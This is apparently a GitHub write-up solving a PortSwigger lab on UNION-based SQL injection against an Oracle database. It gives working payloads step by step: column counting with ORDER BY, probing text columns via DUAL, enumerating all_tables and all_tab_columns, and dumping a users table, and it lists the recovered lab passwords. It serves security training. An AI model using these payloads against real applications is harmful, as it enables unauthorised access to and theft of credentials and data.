## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/0c2ba0af839ebec800b248b0cd40eb2daeb7fc70/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Lab%20Description.png)

## Solution :


> NOTE -  On Oracle databases, every `SELECT` statement must **specify a table to select FROM**. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>
>There is a built-in table on Oracle called **dual** which you can use for this purpose. 
>
> For example: `UNION SELECT 'abc' FROM dual`

#### Determine number of columns -

Order by 3 throws a error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image]()

#### Determine column with text data

Here we use the `DUAL` table which is by defaut present in ORACLE databse

Both columns have text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' FROM DUAL--
```

![image]()

## Retreive data from ORACLE db -


#### List all tables -

We  can list all the tables by querying `SELECT * FROM all_tables`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT table_name,NULL FROM all_tables--
```

We get a list of all the tables,

![image]()


The table which we are interested in is this 

![image]()


#### List all columns -

We can list all the columns by querying `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_UHYHRO'--
```

![image]()


#### Retreive admin's password


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT USERNAME_YNHYHK,PASSWORD_LFRJHB FROM USERS_UHYHRO--
```

![image]()

administrator - `eyjpiterylmsfcqq25ja`
wiener        - `tl4drtumhh8bgq4ndq4f`
carlos        - `z8ir2ghepg2rjjqgq3av`

Now login as administrator,

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/38f651910f2543b2c00b85f4d6a550282f53a2c5/SQL-Injection/Lab%3A%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle/Images/Lab%20Solution.png)


